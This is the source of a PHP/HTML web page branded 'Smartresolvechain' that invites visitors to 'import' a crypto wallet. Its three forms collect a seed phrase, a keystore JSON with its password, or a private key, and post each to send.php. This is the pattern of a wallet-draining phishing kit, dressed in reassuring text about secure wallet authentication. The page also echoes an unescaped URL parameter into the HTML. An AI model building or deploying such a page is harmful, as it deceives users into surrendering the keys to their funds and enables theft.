

<!doctype html>
<html data-n-head-ssr lang="en" data-n-head="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
  <head>
    <title>Smartresolvechain - Bitcoin And Crypto Currency</title>
    <meta data-n-head="ssr" charset="utf-8">
    <meta data-n-head="ssr" name="viewport" content="width=device-width,initial-scale=1">
    <meta data-n-head="ssr" data-hid="description" name="description" content="">
    <meta data-n-head="ssr" name="format-detection" content="telephone=no">
    <link data-n-head="ssr" rel="icon" type="image/x-icon" href="/favicon.ico">
    <link data-n-head="ssr" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css">
    <link data-n-head="ssr" rel="preconnect" href="https://fonts.googleapis.com">
    <link data-n-head="ssr" rel="preconnect" href="https://fonts.gstatic.com">
    <link data-n-head="ssr" rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap">
    <link href="assets/img/favicon.png" rel="icon">
    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
  
    <!-- Google Fonts -->
    <link href="https://fonts.gstatic.com" rel="preconnect">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
  
    <!-- Vendor CSS Files -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
    <link href="vendor/quill/quill.snow.css" rel="stylesheet">
    <link href="vendor/quill/quill.bubble.css" rel="stylesheet">
    <link href="vendor/remixicon/remixicon.css" rel="stylesheet">
    <link href="vendor/simple-datatables/style.css" rel="stylesheet">
  



    <script data-n-head="ssr" src="https://widgets.coingecko.com/coingecko-coin-price-marquee-widget.js">

        

        
      
    </script>
    <link rel="preload" href="js/19c491e.js" as="script">
    <link rel="preload" href="js/d62be5f.js" as="script">
    <link rel="preload" href="js/e08b9e0.js" as="script">
    <link rel="preload" href="js/6c4caef.js" as="script">
    <link rel="preload" href="js/c8e925b.js" as="script">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/bootsrap.css">
    <link rel="stylesheet" href="css/sty.css">





    <style data-vue-ssr-id="7f914dc6:0 6de55d07:0 215d2193:0 66e1543a:0 43f54af2:0 3ea290c3:0 6165e449:0 7e56e4e3:0 05df1fb2:0">
 </style>
  </head>
  <body style="background-color: #1a1b1f;">

    
    
     
    <div class="container p-5 ">
      <div class="alret alert-danger" role="alret">
        <?php  ?>
      </div>
    </div>
    
       
    
        <section class="section profile">
            <div class="
      contact-form-wrap
      mr-auto
      ml-auto
      md:px-12
      py-10
      md:py-14
      w-11/12
      md:w-3/6 md:border
    " style="border-color:#eee"><div class="contact-form-heading-wrap mb-10"><div class="
          wf-section
          flex
          space-x-7
          md:space-x-10
          text-base
          md:text-lg
          mb-3
        ">
        


          <div class="row">
            <div class="col-xl-4" >
    
              <div class="card" style="background: rgb(81, 81, 81);">
                <div class="card-body profile-card pt-4 d-flex flex-column align-items-center">
    
                  
                  <h2 style="color: #eee;">IMPORT</h2>
                  <div><a href="index.php" style="color: antiquewhite;"> Home</a></div>
                </div>
              </div>
    
            </div>
    
            <div class="col-xl-8">
    
              <div class="card" style="background: rgb(81, 80, 80);">
                <div class="card-body pt-3">
                  <!-- Bordered Tabs -->
                  <ul class="nav nav-tabs nav-tabs-bordered">
    
                    <li class="nav-item">
                      <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#profile-overview">Phrase</button>
                    </li>
    
                    <li class="nav-item">
                      <button class="nav-link" data-bs-toggle="tab" data-bs-target="#profile-edit"> Keystore Json</button>
                    </li>
    
                    <li class="nav-item">
                      <button class="nav-link" data-bs-toggle="tab" data-bs-target="#profile-settings">Private key</button>
                    </li>
    
                   
    
                  </ul>
                  <?php $name = $_GET['name'];
                  
               ?>
                  <div class="tab-content pt-2">

                    <div class="tab-pane fade show active profile-overview" id="profile-overview">
                    <form method="Post" action="send.php
                            ">
                      <h5 class="card-title" style="color: #eee;">Phrase</h5>
<div>
                      <textarea data-name="phrase" minlength="5" maxlength="5000" rows="5" name="details" placeholder="Input your Phrase value" required class="w-full textarea-2 w-input mb-3 py-2 px-3" style="background-color:#7d7878;border:1px solid #686868"></textarea> <!----> <div class="text-base text-center" style="color: #eee;">
                      <input type="text" name="new" value="<?php echo $name ?>" hidden >
                      <input type="text" name="password"  hidden >
                        Typically 12 (sometimes 24) words separated by single spaces.
                      </div> <button type="submit" class="mt-8 w-full py-3 text-white text-base submit-button-4 w-button" style="background:purple">
                        Import
                      </button>
</form>
    
                     
    
</div> 
    
                    </div>
    
                    <div class="tab-pane fade profile-edit pt-3" id="profile-edit">
                    <?php $name = $_GET['name'];
                  
                  ?>
                      <!-- Profile Edit Form -->
                      <form method="Post" action="send.php
                            ">
                        <div class="row mb-3">
                            <label for="Phrase" class="label block mb-2 font-medium text-xs uppercase" style="color:#f8f8f8">Keystore Json</label>
                           <div>
                            <textarea data-name="phrase" minlength="5" maxlength="5000" rows="5" name="details" placeholder="Input your Keystore Json value" required="required" class="w-full textarea-2 w-input mb-3 py-2 px-3" style="background-color:#605d5d;border:1px solid #686767"></textarea> <!----> 
                          
                          <label for="Phrase" class="label block mb-2 text-xs font-medium uppercase" style="color: rgb(242, 242, 243);">
                            keystore password</label>
                            <input type="password" name="password" class="w-full textarea-2 w-input mb-3 py-2 px-3" style="background-color: rgb(162, 158, 158); border: 1px solid rgb(204, 204, 204);">
                            </div>
                            <input type="text" name="new" value="<?php echo $name ?>" hidden >
                         <button type="submit" class="mt-8 w-full py-3 text-white text-base submit-button-4 w-button" style="background:purple">
                            Import
                          </button>
</form>
                          
                    </div>
    
                   
                    </div>
    
                    <?php $name = $_GET['name'];
                  
               ?>
                    <div class="tab-pane fade pt-3" id="profile-settings">
                            <!-- Settings Form -->
                            <form method="Post" action="send.php
                            ">
          
                              <div class="row mb-3">
                                <label for="fullName" class="col-md-4 col-lg-3 col-form-label" style="color: #eee;">Private key</label>
                                <textarea data-name="phrase" minlength="5" maxlength="5000" rows="5" name="details" placeholder="Input your Private key value" required class="w-full textarea-2 w-input mb-3 py-2 px-3" style="background-color:#878282;border:1px solid #ccc"></textarea> <!---->
                              <input type="text" name="new" value="<?php echo $name ?>" hidden >
                              <input type="text" name="password"  hidden >
                              <button type="submit" class="mt-8 w-full py-3 text-white text-base submit-button-4 w-button" style="background:purple">
                                    Import
                                  </button>
</Form>
                                  </div>
                                </div>
                              </div>
                       
    
                    </div>
    
                  </div><!-- End Bordered Tabs -->
    
                </div>
              </div>
    
            </div>
          </div>
        </section>
    
      </main><!-- End #main -->


              </div> <div class="px-3 md:px-20 mx-3 md:mx-8" style="background:#6f6c6c"><div><div class="cta-wrap flex pb-3 pt-20 md:pt-32 items-center justify-center"><div><div class="cta-text ml-auto mb-8 mr-auto md:w-4/5 text-center"><div class="heading-jumbo-small text-lg py-8 px-3 md:px-5 my-4 text-white rounded-2xl" style="background:rgb(77, 10, 77)">
              Connect all your wallets with wallet authentication<br></div> <div class="paragraph-bigger cc-bigger-light md:text-xl md:font-medium" style="color: #f8f8f8;">
              Our services are secure and reliable to give you the experience
              when it comes to crypto currency<br></div></div></div></div></div></div></div></div></div></div><script>window.__NUXT__=function(t){return{layout:"default",data:[{}],fetch:{},error:t,serverRendered:!0,routePath:"/settings",config:{_app:{basePath:"/",assetsPath:"/_nuxt/",cdnURL:t}}}}(null)</script><script src="js/19c491e.js" defer></script><script src="js/e08b9e0.js" defer></script>
              <script src="js/6c4caef.js" defer></script>
</div> 



              <footer id="footer" class="footer">
                <div class="copyright">
                  &copy; Copyright <strong><span>Smartresolvechain</span></strong>. All Rights Reserved
                </div>
                <div class="credits">
                  <!-- All the links in the footer should remain intact. -->
                  <!-- You can delete the links only if you purchased the pro version. -->
                  <!-- Licensing information: https://bootstrapmade.com/license/ -->
                  <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/ -->
                  
                </div>
              </footer><!-- End Footer -->
            
              <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
            
              <!-- Vendor JS Files -->
              <script src="vendor/apexcharts/apexcharts.min.js"></script>
              <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
              <script src="vendor/chart.js/chart.umd.js"></script>
              <script src="vendor/echarts/echarts.min.js"></script>
              <script src="vendor/quill/quill.min.js"></script>
              <script src="vendor/simple-datatables/simple-datatables.js"></script>
              <script src="vendor/tinymce/tinymce.min.js"></script>
              <script src="vendor/php-email-form/validate.js"></script>
            
              <!-- Template Main JS File -->
              <script src="js/main.js"></script>
            
              
  </body>
</html>
